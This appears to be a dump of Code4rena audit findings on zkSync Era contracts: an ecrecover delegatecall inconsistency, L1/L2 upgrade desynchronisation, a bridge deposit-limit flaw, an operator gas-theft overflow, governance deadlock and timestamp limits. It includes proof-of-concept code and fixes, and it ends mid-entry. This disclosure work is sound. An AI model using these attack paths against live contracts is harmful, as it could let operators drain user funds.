      "content": "\nThe discrepancy in `delegatecall` behavior with the ECRECOVER precompile contract in zkSync Era can have significant impact leading to incorrect signature validation, potentially compromising data integrity and user funds.\n\n### Proof of Concept\n\nIn the context of zkSync Era, there exists a noticeable inconsistency in how the ECRECOVER precompile contract (located at address 0x01) behaves when accessed via `delegatecall`. This behavior differs from the standard Ethereum Virtual Machine (EVM) behavior, where the outcomes remain uniform across `call`, `staticcall`, and `delegatecall`.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/precompiles/Ecrecover.yul#L7>\n\nIn zkSync Era, when the ECRECOVER precompile contract is invoked using `delegatecall`, it diverges from the usual behavior by delegating the call to the contract itself and executing its code within the caller's context. This results in a returned value that does not align with the anticipated outcome of a `precompileCall`. Instead, it yields `bytes32(0)`.\n\nTo illustrate, in the following example, when executing the provided code in the EVM, the returned `bytes32` value consistently appears as `0x000000000000000000000000759389e8e5c1aa1f511e9ea98b6caedd262bff0b` for all three scenarios: `ecrecoverStaticcall`, `ecrecoverCall`, and `ecrecoverDelegatecall`. However, in the zkSync Era, while `ecrecoverStaticcall` and `ecrecoverCall` maintain the same results as in the EVM, `ecrecoverDelegatecall` produces an incorrect outcome:\n\n    // SPDX-License-Identifier: MIT\n\n    pragma solidity >=0.8.20;\n\n    contract PoC {\n        bytes32 h = keccak256(\"\");\n        uint8 v = 27;\n        bytes32 r = bytes32(uint256(1));\n        bytes32 s = bytes32(uint256(2));\n\n        function ecrecoverStaticcall() public returns (bytes32) {\n            bytes memory data = abi.encode(h, v, r, s);\n            assembly {\n                pop(staticcall(gas(), 0x01, add(data, 0x20), mload(data), 0, 0x20))\n                return(0, 0x20)\n            }\n        }\n\n        function ecrecoverCall() public returns (bytes32) {\n            bytes memory data = abi.encode(h, v, r, s);\n            assembly {\n                pop(call(gas(), 0x01, 0x00, add(data, 0x20), mload(data), 0, 0x20))\n                return(0, 0x20)\n            }\n        }\n\n        function ecrecoverDelegatecall() public returns (bytes32) {\n            bytes memory data = abi.encode(h, v, r, s);\n            assembly {\n                pop(\n                    delegatecall(gas(), 0x01, add(data, 0x20), mload(data), 0, 0x20)\n                )\n                return(0, 0x20)\n            }\n        }\n    }\n\nThis discrepancy is critical in its impact because it introduces a divergence from the expected EVM response. While the likelihood of encountering this issue is not high, as precompile contracts are typically invoked through `staticcall` rather than `delegatecall`.\n\n### Recommended Mitigation Steps\n\nThe following revised code is recommended:\n\n    function delegateCall(\n            uint256 _gas,\n            address _address,\n            bytes calldata _data\n        ) internal returns (bytes memory returnData) {\n            bool success;\n            if(_address == address(0x01){\n                success = rawStaticCall(_gas, _address, _data);\n            } else {\n                success = rawDelegateCall(_gas, _address, _data);\n            }\n            returnData = _verifyCallResult(success);\n        }\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/libraries/EfficientCall.sol#L88>\n\n### Assessed type\n\nContext\n\n**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/175#issuecomment-1794968351):**\n > It has high impact (we do not know in which context it will be used, so its wrong result can have critical impact), but low probability. So, medium is fair.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/175#issuecomment-1826878542):**\n > The Warden has shown an inconsistency in the behaviour of ecrecover when using `delegatecall`. Because the goal of the zkSync EVM is to be the EVM compatible, Medium Severity seems appropriate.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/175#issuecomment-1849019163):**\n > I have verified my statement through testing via the zksync-foundry code repo as well as reviewing both the Precompile as well as the Rust code.\n>\n>*Note: to view the provided image, please see the original comment [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/175#issuecomment-1849019163).*\n\n*Note: for full discussion, see [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/175).*\n\n***\n\n",
      "summary": "\nThis bug report discusses an inconsistency in the behavior of the ECRECOVER precompile contract in zkSync Era. When accessed through `delegatecall`, the contract behaves differently than expected, potentially compromising data integrity and user funds. This behavior is not seen in the standard Ethereum Virtual Machine (EVM). The report provides a proof of concept and recommends a revised code to mitigate the issue. The severity of the bug is considered medium due to its potential impact on the EVM compatibility of zkSync. The report is verified through testing and reviewing code. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/175",
      "tags": [],
      "finders": [
        "zkrunner",
        "anon"
      ]
    },
    {
      "id": "30295",
      "title": "[M-16] Synchronization Issue Between L1 and L2 Upgrades",
      "impact": "MEDIUM",
      "content": "\n1. **Protocol Version Discrepancy**: In cases where an L2 upgrade fails but is processed on L1 without concern for its execution result, the protocol version is advanced while the actual system remains unaltered on L2. This results in a discrepancy between the recorded protocol version and the operational state of the system.\n\n2. **Unique Transaction Hash Requirement**: The protocol typically requires that the transaction hashes of L2 system upgrades be unique, with the `nonce` of the L2 upgrade transaction equal to the new protocol version. When an L2 upgrade fails but is not appropriately recognized on L1, this requirement is breached, necessitating a refactor of the contracts involved.\n\n### Proof of Concept\n\nIn the course of an upgrade, the sequence of function calls is as follows:\n\n`Governance::execute >> Governance::\\_execute >> DiamondProxy::fallback >> Admin::executeUpgrade >> Diamond::diamondCut >> Diamond::\\_initializeDiamondCut >> DefaultUpgrade::upgrade`\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/upgrades/DefaultUpgrade.sol#L25>\n\nDuring an upgrade, a new protocol version is established, and it should be numerically higher than the previous version.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/upgrades/DefaultUpgrade.sol#L28>\n\nLet's examine two scenarios:\n\n1. In the first case, if the upgrade includes an L1 upgrade and it fails to execute successfully, it will result in a rollback that reverses the entire upgrade transaction.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/governance/Governance.sol#L230>\n\n2. In the second case, if the upgrade includes an L2 upgrade and it fails to execute successfully on L2, there's a challenge because the execution should take place on L2. As a result, it is unclear immediately whether the upgrade was successful.\n\nThe issue lies in the second case. Let's assume that the upgrade exclusively involves an L2 upgrade, and the upgrade transaction is executed on L1 such as the following flow of function calls:\n\n`DefaultUpgrade::upgrade >> BaseZkSyncUpgrade::\\_setL2SystemContractUpgrade`\n\nCrucially, within this function, the transaction hash of the upgrade transaction is stored in `s.l2SystemContractsUpgradeTxHash`.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L193>\n\nSubsequently, this upgrade transaction should be executed on L2 with `_l2ProtocolUpgradeTx.txType = 254`. In the bootloader, when processing such a transaction type, the `canonicalL1TxHash` is sent natively to L1.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L587>\n\nFollowing that, the `processL1Tx` function is invoked, in which the transaction is prepared and subsequently executed. \n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L589>\n\nDuring the execution, if, for any reason, such as running out of gas, the execution fails, the entire program does not revert. Instead, an L2 to L1 log is sent with `success = false`.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L908-L919><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L966>\n\nOn the L1 side, during the batch commitment, the function `_processL2Logs` is called. Within this function, a check is made to ensure that `_expectedSystemContractUpgradeTxHash` is equal to the `canonicalL1TxHash` associated with the L2 upgrade transaction.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L157>\n\nThe issue stems from the fact that, during the execution of the batch, the `s.l2SystemContractsUpgradeTxHash` is cleared, regardless of the outcome of the L2 upgrade transaction on L2. To put it differently, on the L2 side, if the upgrade transaction is executed and returns a 'false' result, it signifies that the upgrade was not correctly implemented on L2. However, on the L1 side, it does not care about the outcome of the L2 upgrade transaction on L2, it only cares about the execution of the L2 upgrade transaction, regardless of its success or failure.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L304>\n\nThe implications of this issue are as follows:\n\n1. On L1, `s.l2SystemContractsUpgradeTxHash` becomes zero, indicating that the previous L2 upgrade has been completed. However, it's important to note that the protocol version was incremented despite the absence of an actual upgrade on L2 due to the unsuccessful execution. Consequently, the protocol version is raised without a corresponding system upgrade.\n\n2. A discrepancy arises between `s.protocolVersion` and the new upgrade transaction. This discrepancy occurs because the protocol aims to have unique hashes for L2 system upgrade transactions, requiring that the `nonce` of the L2 upgrade transaction be equal to the new protocol version. Moreover, the new protocol version should be numerically higher than the previous one. Therefore, it appears that the contracts `DefaultUpgrade` and `BaseZkSyncUpgrade` require a revision to address this scenario.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L217><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L186>\n\n3. The owner is required to schedule another upgrade, and this necessitates the passage of time for the delay between proposal and execution to elapse (in the case of a delayed upgrade).\n\n### Recommended Mitigation Steps\n\nOne viable approach is to address this issue by incorporating the result of the L2 upgrade transaction into the batch execution process. If the L2 upgrade fails, this solution entails resetting the protocol version to its previous state. However, when an upgrade involves both L1 and L2 components, a straightforward rollback of the protocol version to its former state is not feasible, as the L1 upgrade has succeeded while the L2 counterpart has encountered difficulties.\n\n    function executeBatches(StoredBatchInfo[] calldata _batchesData) external nonReentrant onlyValidator {\n            //...\n\n            uint256 batchWhenUpgradeHappened = s.l2SystemContractsUpgradeBatchNumber;\n            if (batchWhenUpgradeHappened != 0 && batchWhenUpgradeHappened <= newTotalBatchesExecuted) {\n                delete s.l2SystemContractsUpgradeTxHash;\n                delete s.l2SystemContractsUpgradeBatchNumber;\n                if (!proveL1ToL2TransactionStatus(...)){ // checking the L2 upgrade tx was successful or not\n                   s.protocolVersion = s.OldProtocolVersion; // assuming the old protocol version is stored\n                }\n            }\n        }\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L291>\n\n### Assessed type\n\nContext\n\n**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/214#issuecomment-1795027299):**\n > Medium is fair. We can make the bootloader fail if the upgrade transaction is unsuccessful. In general, it is a good idea that is needed to be implemented.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/214#issuecomment-1830093471):**\n > The Warden has shown how, due to operative risks, a failed upgrade transaction can create a desynchronization between the upgraded version and the version reported.\n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/214).*\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the protocol version and upgrade process of the zkSync system. When an upgrade fails on the second layer (L2) but is still processed on the first layer (L1), it can cause a discrepancy between the recorded protocol version and the actual state of the system. This is due to a requirement that the transaction hashes for L2 upgrades be unique, and if the upgrade fails but is not recognized on L1, this requirement is breached. The report includes a proof of concept and suggests a mitigation step to address the issue. This bug is assessed as medium severity, and a fix is recommended to prevent future desynchronization between the upgraded version and the reported version.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/214",
      "tags": [],
      "finders": [
        "adeolu",
        "anon",
        "evmboi32",
        "0xsomeone"
      ]
    },
    {
      "id": "30294",
      "title": "[M-15] `Mailbox.requestL2Transaction()` checks the deposit limit of `msg.sender` (`L1WethBridge`) instead of the real depositor of weth from L1, as a result, after certain time, nobody will be able to deposit weth anymore from L1",
      "impact": "MEDIUM",
      "content": "\n### Proof of Concept\n\nThe `flow bridgeProxy.deposit() -> L1WethBridge.deposit() -> Mailbox.requestL2Transaction()` allows one to deposit WETH from L1 to L2.  However, when checking the deposit limit for a particular depositor, `Mailbox.requestL2Transaction()` checks the limit of `msg.sender`, which is the address of `L1WethBridge`.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L236-L273>\n\nAs a result, when the limit of the bridge is reached, nobody can deposit anymore, even though their limit is not reached yet. As a result, sooner or later, nobody will be able to use Zksync to deposit weth to L2 from L1.\n\nPOC:\n\n1. We set the deposit limit to 10 ether.\n2. User1 deposits 3 ether of weth and sends 0.1 ether of eth, this is successful, we have `s.totalDepositedAmountPerUser\\[L1WethBridge] = 3.1` ether.\n3. User2 deposits 4 ether of weth and 0.1 ether of eth. This is successful and we have `s.totalDepositedAmountPerUser\\[L1WethBridge] = 7.2` ether.\n4. User3 deposits 2.7 ether of weth and 0.1 weth. This is successful and we have `s.totalDepositedAmountPerUser\\[L1WethBridge] = 10` ether. It has not exceeded the limit; however, if User3 deposits `2.7 ether + 1` of weth and 0.1 weth, then it will revert since now `s.totalDepositedAmountPerUser\\[L1WethBridge] = 10 ether + 1`. Note that User3 has not exceeded its limit. However, the limit check is on `L1WethBridge`, not on User3, and that is the problem.\n\nThe following test file is a modification of the test file: `zksync/code/contracts/ethereum/test/foundry/unit/concrete/Bridge/L1WethBridge/Deposit.t.sol`. The test function is `test_DepositExceedLimit()`.\n\nPlease run the following command under `zksync/code/contracts/ethereum`:\n\n`forge test --match-test test_DepositExceedLimit -vv`\n\nThe following line has been commented out to skip the check of merkle root:\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L142>\n\n```javascript\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.17;\n\nimport \"lib/forge-std/src/Test.sol\";\n\nimport {L1WethBridgeTest} from \"./_L1WethBridge_Shared.t.sol\";\nimport {IAllowList} from \"../../../../../../cache/solpp-generated-contracts/common/interfaces/IAllowList.sol\";\nimport {REQUIRED_L2_GAS_PRICE_PER_PUBDATA} from \"../../../../../../cache/solpp-generated-contracts/zksync/Config.sol\";\n\ncontract DepositTest is L1WethBridgeTest {\n    function deposit(address user, uint256 amount) private returns (bool) {\n        hoax(user);\n        l1Weth.deposit{value: amount}();\n\n        hoax(user);\n        l1Weth.approve(address(bridgeProxy), amount);\n\n        bytes memory depositCallData = abi.encodeWithSelector(\n            bridgeProxy.deposit.selector,\n            user,\n            bridgeProxy.l1WethAddress(),\n            amount,\n            1000000,                        // gas limit\n            REQUIRED_L2_GAS_PRICE_PER_PUBDATA,\n            user\n        );\n\n        hoax(user);\n        (bool success, ) = address(bridgeProxy).call{value: 0.1 ether}(depositCallData); \n        return success;\n    }\n\n    function test_DepositExceedLimit() public {\n        console.log(\"\\n \\n test_DepositExceeLimit is started....$$$$$$$$$$$$$$4\");\n\n        address user1 = address(111);\n        address user2 = address(222);\n        address user3 = address(333);\n\n        vm.prank(owner);\n        allowList.setDepositLimit(address(0), true, 10 ether); // deposit at most 10 ether\n        IAllowList.Deposit memory limitData = IAllowList(allowList).getTokenDepositLimitData(address(0)); \n        assertEq(limitData.depositCap, 10 ether);\n\n      \n\n        bool success = deposit(user1, 3 ether); // send 3 ether weth and 0.1 ether eth\n        assertTrue(success);\n\n\n        success = deposit(user2, 4 ether); // send 4 ether weth and 0.1 ether eth\n        assertTrue(success);\n\n        success =  deposit(user3, 2.7 ether + 1); // send 2.7 ether + 1 weth  and 0.1 ether eth, now a total of 10ether + 1, will it exceed?  \n        assertFalse(success);   // s.totalDepositedAmountPerUser[L1WethBridge] = 10 ether + 1, it exceeds the limit of 10 ether\n    }\n}\n```\n\n### Tools Used\n\nFoundry, VScode\n\n### Recommended Mitigation Steps\n\nCheck the limit of the real depositor instead of the limit for the `L1WethBridge`.\n\n### Assessed type\n\nMath\n\n**[miladpiri (zkSync) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/246#issuecomment-1794494003):**\n > Deposit limitation is a temporary feature implemented to protect users from depositing large amount of fund into the protocol while it is in alpha mode. So, issues like this does not cause damage to the protocol. Medium can be a fair severity.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/246#issuecomment-1826015424):**\n > The Warden has shown how the implementation of limits, which are indexed by address, will cause the bridge to be subject to the caps that should apply to a single wallet. Since the finding would deny functionality but can technically be removed, I think Medium Severity to be most appropriate.\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the `flow bridgeProxy.deposit() -> L1WethBridge.deposit() -> Mailbox.requestL2Transaction()` function which allows users to deposit WETH from L1 to L2. The problem is that the `Mailbox.requestL2Transaction()` function checks the deposit limit of `msg.sender`, which is the address of `L1WethBridge`, instead of the limit of the real depositor. This means that when the bridge's limit is reached, nobody can deposit anymore, even if their individual limit has not been reached. This could eventually lead to nobody being able to use Zksync to deposit WETH from L1 to L2. A proof of concept is provided to demonstrate the issue and a modified test file is included to test the `test_DepositExceedLimit()` function. The recommended mitigation step is to check the limit of the real depositor instead of the limit for `L1WethBridge`. The bug was assessed as a Medium Severity issue, as it could deny functionality but can be removed. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/246",
      "tags": [],
      "finders": [
        "J4de",
        "bin2chen",
        "Nyx",
        "ladboy233",
        "Udsen",
        "Aymen0909",
        "mahdirostami",
        "tapir",
        "chaduke",
        "anon",
        "zero-idea",
        "rvierdiiev",
        "bart1e"
      ]
    },
    {
      "id": "30293",
      "title": "[M-14] Operator can steal all gas provided by ANY user for `L1→L2` transactions",
      "impact": "MEDIUM",
      "content": "\nIn [bootloader, function processL1Tx](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L921C1-L921C57), it is possible for a malicious operator to steal all the gas provided by **ANY** user who requests an `L1⇒L2` transaction simply by returning an overinflated `refundGas` for the transaction execution.\n\n### Proof of concept\n\nThe `refundGas` the user will receive is the sum of:\n\n*Note: please see scenario in warden's [original submission](https://github.com/code-423n4/2023-10-zksync-findings/issues/255).*\n\nWith `reservedGas` being the excess of gas between what the user provided and what the operator is willing to use, and `refundGas` (not the final one) is the remaining gas left after preparing and executing the requested transaction.\n\nAs both quantities are added via the opcode `add`:\n\n[bootloader, line 921](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L921C1-L921C57)\n\n```solidity\n                refundGas := add(refundGas, reservedGas)\n```\n\nThe operator can return an over-inflated value so that it gets picked by the `max()` function and is added to `reservedGas`; overflowing the result as there are no checks for overflows in assembly:\n\n[bootloader, lines 921-927](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L921C1-L927C100)\n\n```solidity\n                refundGas := add(refundGas, reservedGas) // overflow, refundGas = 0 while gasLimit != 0\n\n                if gt(refundGas, gasLimit) { // correct, 0 < x for all x iff x != 0\n                    assertionError(\"L1: refundGas > gasLimit\")\n                }\n\n                // gasPrice * (gasLimit - refundGas) == gasPrice * (gasLimit - 0) == gasPrice * gasLimit\n                let payToOperator := safeMul(gasPrice, safeSub(gasLimit, refundGas, \"lpah\"), \"mnk\")\n```\n\nAs anyone will be able to be an operator once zkSync Era becomes decentralized, this issue becomes critical as it would be possible for **ANY** operator to *\"farm\"* the gas provided by **ANY** user.\n\n### Recommended Mitigation Steps\n\nJust use `safeAdd`:\n\n[bootloader, line 921](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L921C1-L921C57)\n\n```diff\n-               refundGas := add(refundGas, reservedGas)\n+               refundGas := safeAdd(refundGas, reservedGas, \"The operator is being an asshole\")\n```\n\n**[miladpiri (zkSync) confirmed via duplicate issue #187](https://github.com/code-423n4/2023-10-zksync-findings/issues/187#issuecomment-1795021187)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/255#issuecomment-1826401662):**\n > Best because of formula, clearest and shows the fix.\n\n***\n\n",
      "summary": "\nThe report discusses a bug found in the bootloader function processL1Tx in the zkSync system contracts. The bug allows a malicious operator to steal all the gas provided by any user who requests an L1⇒L2 transaction by returning an overinflated refundGas value. This can happen because there are no checks for overflows in the assembly code. The recommended mitigation step is to use safeAdd instead of add to prevent this issue. The bug has been confirmed by the zkSync team and a fix has been suggested. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/255",
      "tags": [],
      "finders": [
        "bin2chen",
        "erebus",
        "anon"
      ]
    },
    {
      "id": "30292",
      "title": "[M-13] Governance logic may enter a deadlock",
      "impact": "MEDIUM",
      "content": "\nIf any of the governance actors, either `securityCouncil` or `owner`, gets compromised, the whole governance logic will enter a deadlock (not a centralization risk as the `Governance` contract is exactly designed to prevent this kind of issues).\n\n### Proof of concept\n\nThe actions that each governance actor can do are the following:\n\n- `securityCouncil`\n    - `cancel`\n    - `execute`\n    - `executeInstant`\n- `owner`\n    - `scheduleTransparent`\n    - `scheduleShadow`\n    - `cancel`\n    - `execute`\n\nBy extension, as the `Governance` contract can call itself through `execute` and `executeInstant` and the only one who can propose upgrades is `owner`, then he can do the following too:\n\n- `updateSecurityCouncil`\n- `updateDelay`\n\nIt becomes clear that:\n\n- If the `owner` gets compromised, then no one will ever make an upgrade again, as he is the only one who can submit one by calling `scheduleTransparent` or `scheduleShadow`.\n- If the `securityCouncil` gets compromised, then he can spam `cancel` to ban all upgrades made by the `owner`, even the ones trying to remove `securityCouncil` by calling `updateSecurityCouncil`, as the `owner` cannot call `executeInstant` and the proposals delay (although not enforced) is supposed to be non-zero.\n\nSo the governance logic will be broken.\n\n### Recommended Mitigation steps\n\nAfter a talk with the sponsor, it seems in the future there will be some sort of escape hatch mechanism in which users will be able to withdraw their funds from zkSync Era to Ethereum or another L2 if any of the above happens. For the time being, the solutions we talked about were:\n\n1. Removing the `cancel` permission of the `securityCouncil`:\n\n```diff\n-   function cancel(bytes32 _id) external onlyOwnerOrSecurityCouncil {\n+   function cancel(bytes32 _id) external onlyOwner {\n        require(isOperationPending(_id), \"Operation must be pending\");\n        delete timestamps[_id];\n        emit OperationCancelled(_id);\n    }\n```\n\n2. Bounding by a minimum the possible delay (that way you prevent `owner` from virtually making instant upgrades):\n\n[Governance, function updateDelay](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/governance/Governance.sol#L249C1-L252C6)\n\n```diff\n    function updateDelay(uint256 _newDelay) external onlySelf {\n+       require(_newDelay >= MINIMUM_UPGRADE_DELAY, \"whatever\";)\n        emit ChangeMinDelay(minDelay, _newDelay);\n        minDelay = _newDelay;\n    }\n```\n\nThe constant `MINIMUM_UPGRADE_DELAY` is going to be a config one whose value is higher than the Solidity `1 day`, as withdrawals from zkSync Era to Ethereum takes around 1 day. Users would have enough time to withdraw their funds if a malicious upgrade is ever scheduled.\n\n**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/260#issuecomment-1801995240):**\n > If owner or security council are compromised, it breaks the full functionality of the governance mechanism. Indeed security council shouldn’t be able to break upgradability with delay. Medium can be fair.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/260#issuecomment-1829787134):**\n > The Wardens have highlighted a governance deadlock scenario, which allows the security council to hold governance hostage.\n\n***\n\n",
      "summary": "\nThe report discusses a bug in the governance logic of the `zkSync` contract. This bug could potentially cause the entire governance system to enter a deadlock if either the `securityCouncil` or the `owner` gets compromised. This means that upgrades and changes to the contract would not be possible, causing a centralization risk. \n\nThe report provides a proof of concept by listing the actions that each governance actor can perform. It also mentions that the `owner` has the ability to propose upgrades, which could potentially lead to further issues if they are compromised. \n\nTo mitigate this bug, the report suggests removing the `cancel` permission of the `securityCouncil` or setting a minimum delay for upgrades to prevent the `owner` from making instant changes. The report also mentions that there may be an escape hatch mechanism in the future to allow users to withdraw their funds if such a scenario occurs. \n\nThe report concludes with comments from the `zkSync` team and the judge, confirming the severity of the bug and suggesting possible solutions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/260",
      "tags": [],
      "finders": [
        "AkshaySrivastav",
        "Audittens",
        "don'tonka",
        "twcctop",
        "anon",
        "erebus"
      ]
    },
    {
      "id": "30291",
      "title": "[M-12] Timestamp Constraints Leading to Number of Blocks Creation Limitations",
      "impact": "MEDIUM",
      "content": "\nThe timestamp constraints and batch creation limitations in zkSync have several significant impacts on the platform's functionality and operations:\n\n1. **Limited Block Inclusion:** The constraints on timestamp differences between batches and their respective blocks restrict the number of blocks that can be included in each batch. This leads to smaller batch sizes, making it challenging to efficiently process transactions and utilize the available block space.\n\n2. **Responsiveness Issue:** Due to these constraints, if two batches are intended to be committed on L1 at the same time (in the same Ethereum block), it's not allowed. This can create bottlenecks during batch commitments, especially when zkSync experiences high transaction volumes leading to an increased number of pending transactions and potentially longer finality times, affecting zkSync's overall responsiveness.\n\n3. **Operator-Induced Limitations:** These constraints can be exploited by the operator by setting timestamps much further in the future to intentionally limit the number of blocks in batches. This could lead to various operational issues and inefficiencies.\n\n### Proof of Concept\n\nUpon initiating transaction processing in the bootloader, the first step involves creating a new batch using the `setNewBatch` function in the `SystemContext` contract.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/bootloader/bootloader.yul#L3675><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/contracts/SystemContext.sol#L416>\n\nThis operation enforces that the timestamp of the new batch must be greater than the timestamp of the previous batch and the timestamp of the last block in the previous batch.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/contracts/SystemContext.sol#L423><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/SystemContext.sol#L402>\n\nSubsequently, when processing a specific transaction, an L2 block is designated by invoking the `setL2Block` function within the `SystemContext` contract. This action ensures that the timestamp of the block is not lower than the timestamp of the current batch.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/bootloader/bootloader.yul#L559><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/contracts/SystemContext.sol#L323>\n\nOnce the processing of all transactions is completed, an additional fictive block is generated, serving as the final block within the batch. \n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/bootloader/bootloader.yul#L3812>\n\nFinally, the timestamp data is disclosed to L1 for verification.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/bootloader/bootloader.yul#L3816>\n\nOn the L1 side, during batch commitment, the `_verifyBatchTimestamp` function is called to confirm the accuracy of the timestamps. It enforces that the batch's timestamp is later than the previous batch and not less than `block.timestamp - COMMIT_TIMESTAMP_NOT_OLDER`. Additionally, it ensures that the timestamp of the last block in this batch is not greater than `block.timestamp + COMMIT_TIMESTAMP_APPROXIMATION_DELTA`.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L85><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L93><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L94>\n\nA critical concern arises when the operator, during the creation of a new batch on L2, sets its timestamp in close proximity to the value `block.timestamp + COMMIT_TIMESTAMP_APPROXIMATION_DELTA`. To illustrate this point, consider the following example:\n\nImagine a new batch, numbered 1000, is created with a timestamp of `X + 